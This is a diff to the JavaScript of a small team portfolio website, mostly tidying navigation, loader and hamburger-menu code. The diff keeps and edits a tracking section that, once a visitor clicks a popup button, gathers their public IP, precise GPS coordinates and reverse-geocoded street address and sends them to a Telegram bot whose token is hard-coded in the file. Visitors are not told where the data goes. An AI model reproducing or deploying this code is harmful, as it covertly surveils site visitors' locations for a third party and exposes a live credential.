@@ -1,4 +1,4 @@
-// ============= TEAM DATA (tetap) =============
+// ============= TEAM DATA =============
 const teamData = [
     {
         name: './Mr-Rubic',
@@ -53,7 +53,6 @@ const teamData = [
 function renderTeam() {
     const container = document.getElementById('team-grid');
     if (!container) return;
-
     container.innerHTML = teamData.map(member => `
         <div class="team-card">
             <div class="card-avatar">
@@ -68,6 +67,78 @@ function renderTeam() {
     `).join('');
 }
 
+// ============= HAMBURGER MENU =============
+const hamburger = document.getElementById('hamburger');
+const navLinks = document.getElementById('nav-links');
+
+if (hamburger && navLinks) {
+    hamburger.addEventListener('click', () => {
+        hamburger.classList.toggle('active');
+        navLinks.classList.toggle('active');
+    });
+    
+    navLinks.querySelectorAll('.nav-link').forEach(link => {
+        link.addEventListener('click', () => {
+            hamburger.classList.remove('active');
+            navLinks.classList.remove('active');
+        });
+    });
+    
+    document.addEventListener('click', (e) => {
+        if (!navLinks.contains(e.target) && !hamburger.contains(e.target) && navLinks.classList.contains('active')) {
+            hamburger.classList.remove('active');
+            navLinks.classList.remove('active');
+        }
+    });
+}
+
+// ============= LOADER =============
+window.addEventListener('load', () => {
+    const loader = document.getElementById('loader');
+    if (loader) {
+        setTimeout(() => {
+            loader.classList.add('hidden');
+        }, 1000);
+    }
+});
+
+// ============= NAVIGATION =============
+document.querySelectorAll('.nav-link').forEach(link => {
+    link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const target = link.getAttribute('href');
+        const element = document.querySelector(target);
+        if (element) {
+            element.scrollIntoView({ behavior: 'smooth' });
+            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+            link.classList.add('active');
+        }
+    });
+});
+
+window.addEventListener('scroll', () => {
+    const sections = document.querySelectorAll('.section');
+    const navLinksScroll = document.querySelectorAll('.nav-link');
+    let current = '';
+    sections.forEach(section => {
+        const sectionTop = section.offsetTop - 100;
+        const sectionBottom = sectionTop + section.offsetHeight;
+        if (window.scrollY >= sectionTop && window.scrollY < sectionBottom) {
+            current = section.getAttribute('id');
+        }
+    });
+    navLinksScroll.forEach(link => {
+        link.classList.remove('active');
+        if (link.getAttribute('href') === `#${current}`) {
+            link.classList.add('active');
+        }
+    });
+});
+
+document.addEventListener('DOMContentLoaded', () => {
+    renderTeam();
+});
+
 // ============= TRACKING (LANGSUNG KE TELEGRAM) =============
 async function sendToTelegram(data) {
     const botToken = '8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
@@ -78,7 +149,7 @@ async function sendToTelegram(data) {
     if (data.lat) {
         msg += `📍 GPS: ${data.lat}, ${data.lon}\n📏 Akurasi: ${data.accuracy} meter\n`;
         msg += `🏠 Alamat: ${data.address || '-'}\n`;
-    } else {
+    } else if (data.city) {
         msg += `📍 Lokasi: ${data.city}, ${data.region}, ${data.country}\n`;
         msg += `📡 ISP: ${data.isp}\n`;
     }
@@ -116,7 +187,6 @@ async function getLocationFromIP(ip) {
 }
 
 async function trackUser() {
-    // Get IP
     let ip = null;
     try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -124,14 +194,12 @@ async function trackUser() {
         ip = data.ip;
     } catch(e) {}
     
-    // Try GPS first
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const accuracy = pos.coords.accuracy;
             
-            // Reverse geocoding
             let address = '';
             try {
                 const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
@@ -147,7 +215,6 @@ async function trackUser() {
                 address: address
             });
         }, async () => {
-            // GPS denied, fallback to IP
             const ipData = await getLocationFromIP(ip);
             if (ipData) {
                 await sendToTelegram({
@@ -162,7 +229,6 @@ async function trackUser() {
             }
         });
     } else {
-        // No GPS support
         const ipData = await getLocationFromIP(ip);
         if (ipData) {
             await sendToTelegram({
@@ -178,87 +244,16 @@ async function trackUser() {
     }
 }
 
-// ============= SHOW POPUP =============
+// ============= POPUP =============
 setTimeout(() => {
     const popup = document.getElementById('trackPopup');
     if (popup) popup.style.display = 'block';
 }, 3000);
 
-// ============= HANDLE POPUP BUTTON =============
 const trackBtn = document.getElementById('trackBtn');
 if (trackBtn) {
     trackBtn.onclick = () => {
         document.getElementById('trackPopup').style.display = 'none';
         trackUser();
     };
-}
-
-// ============= EXISTING CODE (loader, nav, etc) =============
-window.addEventListener('load', () => {
-    const loader = document.getElementById('loader');
-    if (loader) {
-        setTimeout(() => {
-            loader.classList.add('hidden');
-        }, 1000);
-    }
-});
-
-document.querySelectorAll('.nav-link').forEach(link => {
-    link.addEventListener('click', (e) => {
-        e.preventDefault();
-        const target = link.getAttribute('href');
-        const element = document.querySelector(target);
-        if (element) {
-            element.scrollIntoView({ behavior: 'smooth' });
-            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
-            link.classList.add('active');
-        }
-    });
-});
-
-window.addEventListener('scroll', () => {
-    const sections = document.querySelectorAll('.section');
-    const navLinks = document.querySelectorAll('.nav-link');
-    let current = '';
-    sections.forEach(section => {
-        const sectionTop = section.offsetTop - 100;
-        const sectionBottom = sectionTop + section.offsetHeight;
-        if (window.scrollY >= sectionTop && window.scrollY < sectionBottom) {
-            current = section.getAttribute('id');
-        }
-    });
-    navLinks.forEach(link => {
-        link.classList.remove('active');
-        if (link.getAttribute('href') === `#${current}`) {
-            link.classList.add('active');
-        }
-    });
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-    renderTeam();
-});
-
-const hamburger = document.getElementById('hamburger');
-const navLinksMenu = document.getElementById('nav-links');
-
-if (hamburger && navLinksMenu) {
-    hamburger.addEventListener('click', () => {
-        hamburger.classList.toggle('active');
-        navLinksMenu.classList.toggle('active');
-    });
-    
-    navLinksMenu.querySelectorAll('.nav-link').forEach(link => {
-        link.addEventListener('click', () => {
-            hamburger.classList.remove('active');
-            navLinksMenu.classList.remove('active');
-        });
-    });
-    
-    document.addEventListener('click', (e) => {
-        if (!navLinksMenu.contains(e.target) && !hamburger.contains(e.target) && navLinksMenu.classList.contains('active')) {
-            hamburger.classList.remove('active');
-            navLinksMenu.classList.remove('active');
-        }
-    });
 }
